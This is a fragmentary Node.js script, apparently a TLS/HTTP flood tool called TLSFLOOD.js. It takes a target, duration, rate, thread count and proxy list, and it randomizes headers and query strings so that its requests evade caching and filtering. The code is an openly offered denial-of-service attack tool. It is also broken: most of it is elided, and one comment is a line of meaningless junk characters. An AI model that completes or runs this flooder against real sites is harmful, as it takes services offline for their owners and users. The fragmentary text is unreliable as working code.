const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Usage: node TLSFLOOD.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
 ...
 //dsfksdkfndsknfksndfnskdfdskfnsdkfsdnkfsdnfdnskfdnskfndskfnsdkfndksnfksdnfkdsnfkdsnfksdnfkdsnfksdnkfnsdkfndskfnsdkfdnsfkdsnkfndskfnsdkfndskfndskfndskfndskfnsdkfndskfndskfndskfnkdsfndskfnsdkfsdnkfndsfsdkfsdnnksdfknfnkkfdnskdfsksfknsfkn
...
let randomHeaders = headerGenerator.getHeaders();
 ...
 headers["referer"] = Ref;
 headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(200); 
